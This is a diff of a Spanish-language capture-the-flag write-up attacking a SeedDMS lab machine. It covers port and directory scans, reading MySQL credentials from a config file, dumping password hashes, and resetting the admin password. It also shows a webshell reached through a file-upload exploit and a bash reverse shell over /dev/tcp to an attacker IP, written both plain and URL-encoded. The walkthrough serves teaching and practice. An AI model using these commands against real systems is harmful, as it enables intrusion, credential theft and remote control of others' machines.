@@ -31,6 +31,40 @@ Vemos que hay 2 puertos abiertos, el http y un puerto para un servidor de mysql
 
 -------------------------------------------------------------------------------
 
+Miramos más puertos por si hay alguno más abierto:
+ 
+```bash
+> sudo nmap -sS -Pn -n 192.168.1.36 -p30000-40000
+```
+
+```bash
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-11 13:10 EST
+Nmap scan report for 192.168.1.36
+Host is up (0.012s latency).
+Not shown: 10000 closed tcp ports (conn-refused)
+PORT      STATE SERVICE VERSION
+33060/tcp open  mysqlx?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
+|     Invalid message"
+|     HY000
+|   LDAPBindReq: 
+|     *Parse error unserializing protobuf message"
+|     HY000
+|   oracle-tns: 
+|     Invalid message-frame."
+|_    HY000
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port33060-TCP:V=7.93%I=7%D=2/11%Time=63E7DA28%P=x86_64-pc-linux-gnu%r(N
+SF:ULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\
+SF:x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPOp
+....
+```
+
+y vemos que hay un puerto 33060 con un servicio mysqlx, que suponemos será algún tipo de servicio sql.
+
+-------------------------------------------------------------------------------
+
 Realizamos un escaneo para obtener más información acerca de la máquina.
 
 ```bash
@@ -76,6 +110,7 @@ HOP RTT     ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 13.82 seconds
 ```
+
 -------------------------------------------------------------------------------
 
 Vemos que en el puerto 80, hay un servicio Apache versión 2.4.41 y en el puerto 3306 el servidor MySQL es la versión 8.0.25
@@ -97,10 +132,14 @@ Frame, HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[192.168.1.36]
 JQuery[1.11.2], Modernizr[2.8.3-respond-1.4.2.min], Script[text/javascript],
 Title[Welcome to the land of pwnland], X-UA-Compatible[IE=edge]
 ```
+-------------------------------------------------------------------------------
+
+Y ahora, vamos a realizar un descubrimiento de directorios en la web con WFuzz
 
 ```bash
 └─$ wfuzz --hc 400,404,403,405,500 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://192.168.1.36/FUZZ    
 ```
+
 ```bash
  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
  /usr/lib/python3/dist-packages/requests/__init__.py:102: RequestsDependencyWarning:urllib3 (1.26.12) or chardet (5.1.0)/charset_normalizer (2.0.6) doesn't match a supported version!
@@ -147,12 +186,21 @@ Filtered Requests: 220541
 Requests/sec.: 330.9197
 ```
 
+-------------------------------------------------------------------------------
+
+Observando la web podríamos anotar algunos nombres que quizá pudieran ser utilizados como credenciales. Podemos guardar estos nombres en un fichero de texto:
+
+```
 Possible users:
 EMMANUEL GOLDSTEIN
 Moonlight
 templatemo
+```
 
+-------------------------------------------------------------------------------
 
+Puesto que la máquina víctima tiene servidores SQL corriendo, vamos a realizar un análisis con nmap enfocado a descubrir posibles vectores en el servicio SQL:
+ 
 ```bash
 └─$ nmap -sV -p 3306 --script mysql-audit,mysql-databases,mysql-dump-hashes,mysql-empty-password,mysql-enum,mysql-info,mysql-query,mysql-users,mysql-variables,mysql-vuln-cve2012-2122 192.168.1.36
 ```
@@ -190,40 +238,14 @@ FLUS
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 5.60 seconds
 ```
- 
-```bash
-> sudo nmap -sS -Pn -n 192.168.1.36 -p30000-40000
-```
 
-```bash
-Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-11 13:10 EST
-Nmap scan report for 192.168.1.36
-Host is up (0.012s latency).
-Not shown: 10000 closed tcp ports (conn-refused)
-PORT      STATE SERVICE VERSION
-33060/tcp open  mysqlx?
-| fingerprint-strings: 
-|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
-|     Invalid message"
-|     HY000
-|   LDAPBindReq: 
-|     *Parse error unserializing protobuf message"
-|     HY000
-|   oracle-tns: 
-|     Invalid message-frame."
-|_    HY000
-1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
-SF-Port33060-TCP:V=7.93%I=7%D=2/11%Time=63E7DA28%P=x86_64-pc-linux-gnu%r(N
-SF:ULL,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(GenericLines,9,"\x05\0\0\0\x0b\
-SF:x08\x05\x1a\0")%r(GetRequest,9,"\x05\0\0\0\x0b\x08\x05\x1a\0")%r(HTTPOp
-....
-```
+-------------------------------------------------------------------------------
 
-Miramos:
+Hacemos un chequeo más intensivo de la web. Y vemos que internamente se están utilizando una serie de ficheros JavaScript. Miramos:
 http://192.168.1.36/js/main.js
 
-
-Comentario que dice que hay que comprobar que la versión usada es la misma que 
+Vemos un comentario que dice que hay que comprobar que la versión usada es la misma que en el server:
+ 
 ```
 [var $slide = $('.slide');              
 // give active class to first link        
@@ -231,22 +253,33 @@ Comentario que dice que hay que comprobar que la versión usada es la misma que
 $($('nav a')[0]).addClass('active');
 ```
 
-Intentamos acceder a 
+De ese modo uno puede pensar que hay una ruta web a la que podríamos acceder. Así pues, intentamos acceder a: 
+
 http://192.168.1.36/seeddms51x/seeddms-5.1.22/
 
+Y nos encontramos con un panel de autenticación.
+Como no tenemos mucha idea de qué es ese seeddms, buscamos información por internet, y resulta ser un framework de código abierto el cual podemos inspeccionar.
 
 Descargamos el framework seeddms51x y vemos como está estructurado.
-esto nos permite saber que existe un fichero en /conf/settings.xml
-que puede contener credenciales de algún tipo.
+Esto nos permite saber que existe un fichero en **/conf/settings.xml** que puede contener credenciales de algún tipo.
 
-Como podemos ver, hemos encontrado unas credenciales para MySQL.
+Así pues, accediendo a la ruta que hemos aprendido de descargar el framework, hemos encontrado unas credenciales para MySQL.
 
 ![conf_settings_xml.png](conf_settings_xml.png)
 
+Y ahora podemos acceder al servicio MySql de la máquina víctima.
+
+-------------------------------------------------------------------------------
 
 ```bash
 > mysql -h 192.168.1.36 -u seeddms -p
 ```
+
+Hemos accedido a la base de datos de la máquina remota:
+
+-------------------------------------------------------------------------------
+
+Mostramos las bases de datos que se gestionan con ese servicio:
 
 ```sql
 MySQL> show databases;
@@ -263,9 +296,21 @@ MySQL> show databases;
 | sys                |
 +--------------------+
 ```
+
+-------------------------------------------------------------------------------
+
+Vamos a trabajar con la base de datos **seeddms**
+
+```sql
+MySQL> use seeddms;
+```
+
+Podemos mirar en la base de datos seeddms las tablas que hay, y resulta que hay una tabla users.
+
 ```sql
 MySQL [seeddms]> select * from users;
 ```
+
 ```sql
 +-------------+---------------------+--------------------+-----------------+
 | Employee_id | Employee_first_name | Employee_last_name | Employee_passwd |
@@ -274,9 +319,16 @@ MySQL [seeddms]> select * from users;
 +-------------+---------------------+--------------------+-----------------+
 1 row in set (0,031 sec)
 ```
+Hemos encontrado unas credenciales de un usuario.
+
+-------------------------------------------------------------------------------
+
+También podemos inspeccionar la tabla tblUsers.
+
 ```sql
 MySQL [seeddms]> show columns from tblUsers;
 ```
+
 ```sql
 +---------------+--------------+------+-----+---------+----------------+
 | Field         | Type         | Null | Key | Default | Extra          |
@@ -299,6 +351,8 @@ MySQL [seeddms]> show columns from tblUsers;
 +---------------+--------------+------+-----+---------+----------------+
 ```
 
+Y de esta obtener los datos más importantes:
+
 ```sql
 MySQL [seeddms]> SELECT id, login, pwd FROM tblUsers;
 ```
@@ -311,10 +365,17 @@ MySQL [seeddms]> SELECT id, login, pwd FROM tblUsers;
 |  2 | guest | NULL                             |
 +----+-------+----------------------------------+
 ```
+Vemos que hay una entrada para el usuario admin en la tabla. El password parece estar hasheado con md5.
+
+-------------------------------------------------------------------------------
+
+Por otra parte miramos la base de datos mysql y vemos qué contiene la tabla users:
 
 ```sql
 MySQL [mysql]> select user, authentication_string from user;
 ```
+
+```sql
 +------------------+------------------------------------------------------------------------+
 | user             | authentication_string                                                  |
 +------------------+------------------------------------------------------------------------+
@@ -333,35 +394,15 @@ MySQL [mysql]> select user, authentication_string from user;
 +------------------+------------------------------------------------------------------------+
 9 rows in set (0,002 sec)
 ```
-
-```sql
-MySQL [mysql]> select host, user, authentication_string from user where user="seeddms" and host="localhost";
 ```
 
-```sql
-+-----------+---------+------------------------------------------------------------------------+
-| host      | user    | authentication_string                                                  |
-+-----------+---------+------------------------------------------------------------------------+
-| localhost | seeddms | $A$005$A@]@yCjderspsKBE
-                                               Wb77PQUG8HUGhs0wW9nN5HFf1c5yK41et/8Uz9a4kq4 |
-+-----------+---------+------------------------------------------------------------------------+
-```
+-------------------------------------------------------------------------------
 
-```sql
-MySQL [mysql]> select host, user, authentication_string from user where user="seeddms" and host="127.0.0.1";
-```
-
-```sql
-+-----------+---------+------------------------------------------------------------------------+
-| host      | user    | authentication_string                                                  |
-| 127.0.0.1 | seeddms | $A$005$d 5=
-+-----------+---------+------------------------------------------------------------------------+
-                                   B}x{F -_E-bpSftyzk6e7NqJ6DWIL2AzzxKxSahPoRqZvG9Bej/c7 |
-+-----------+---------+------------------------------------------------------------------------+
-```
+Como hemos encontrado una entrada para las credenciales de admin, vamos a modificarlas a ver si podemos entrar en el panel de autenticación que hemos encontrado antes.
+Creamos un password sencillo, y obtenemos el hash en el mismo formato que hemos visto antes.
 
 ```bash
-└─$ echo -n "123456" | md5sum 
+> echo -n "123456" | md5sum 
 e10adc3949ba59abbe56e057f20f883e  -
 ```
 
@@ -371,13 +412,25 @@ Nótese el parámetro -n para que no añada el newline al final del echo, pues a
 > MySQL [seeddms]> update tblUsers set pwd="e10adc3949ba59abbe56e057f20f883e" where id=1;
 ```
 
+-------------------------------------------------------------------------------
+
+Y ahora lo probamos en la web:
+
 ```
-probarmos ahora la web:
 user admin
 password 123456
 ```
-Ahora podemos ver la web y como funciona. Parece que es una web en la que se pueden subir documentos para posteriormente ser descargados.
+
+Y entramos perfectamente.
+
+Ahora podemos ver la web y como funciona. 
+Parece que es una web en la que se pueden subir documentos para posteriormente ser descargados.
+
 ![creating_docs.png](creating_docs.png)
+
+-------------------------------------------------------------------------------
+
+Buscamos en searchsploit si existe algún exploit para el framework seeddms:
 
 ```bash
 > searchsploit seeddms                 
@@ -394,6 +447,8 @@ SeedDMS < 5.1.11 - 'out.UsrMgr.php' Cross-Site Scripting        | php/webapps/47
 SeedDMS versions < 5.1.11 - Remote Command Execution            | php/webapps/47022.txt
 ---------------------------------------------------------------- ----------------------------
 ```
+
+Y vemos que hay varias cosas. Miramos el primero:
 
 ```bash
 > $ searchsploit -x php/webapps/50062.txt
@@ -421,6 +476,13 @@ Step 4: Now go to example.com/data/1048576/"document_id"/1.php?cmd=cat+/etc/pass
 Note: Here "data" and "1048576" are default folders where the uploaded files are getting saved.
 (END)
 ```
+
+Este nos explica un poco  un método para poder acceder via web a los documentos guardados mediante el servicio. Al acceder a uno de los documentos guardados, podemos inyectar un código PHP que durante la respuesta de la request sea ejecutado.
+Subimos el fichero rce.php que nos permitirá crear una webshell. 
+
+-------------------------------------------------------------------------------
+
+Necesitamos averiguar la ruta exacta donde se guardan los ficheros. Miramos el fichero settings.xml
 
 ```bash
 > cat conf/settings.xml
@@ -461,9 +523,10 @@ Note: Here "data" and "1048576" are default folders where the uploaded files are
 ...
 ```
 
+También podemos mirar algunas tablas de la base de datos, para corroborar a qué directorio va a parar cada versión de documento.
+
 ```sql
 MySQL [seeddms]> select id, document, orgFilename, version, dir from tblDocumentContent;
-
 ```
 
 ```sql
@@ -479,21 +542,30 @@ MySQL [seeddms]> select id, document, orgFilename, version, dir from tblDocument
 5 rows in set (0,006 sec)
 ```
 
+Esta seria la manera de acceder al documento que subimos anteriormente y que contiene el código php que nos permite utilizar la webshell.
+
 http://192.168.1.36/seeddms51x/data/1048576/4/4.php?cmd=id
 
-Esta sería la línea a utilizar para entablar la reverse shell.
+-------------------------------------------------------------------------------
+
+Este es el momento de intentar entablar la reverse shell. Esta sería la línea a utilizar:
+
 ```bash
 bash -c "bash -i >& /dev/tcp/192.168.1.80/443 0>&1"
 ```
-Hemos de recordar que hay que "urlencodear" los > y los & (! Muy IMPORTANTE!)
+Hemos de recordar que hay que "urlencodear" los **>** y los **&** (! Muy IMPORTANTE!)
 
 ```bash
 bash -c "bash -i %3e%26 /dev/tcp/192.168.1.80/443 0%3e%261"
 ```
 
+Por lo tanto esta es la url a utilizar:
+
 http://192.168.1.36/seeddms51x/data/1048576/4/4.php?cmd=bash -c "bash -i %3e%26 /dev/tcp/192.168.1.80/443 0%3e%261"
 
 ![rce.png](rce.png)
+
+-------------------------------------------------------------------------------
 
 Hacemos el tratamiento de la tty típico y estamos en el directorio 4 donde están las versiones.
 
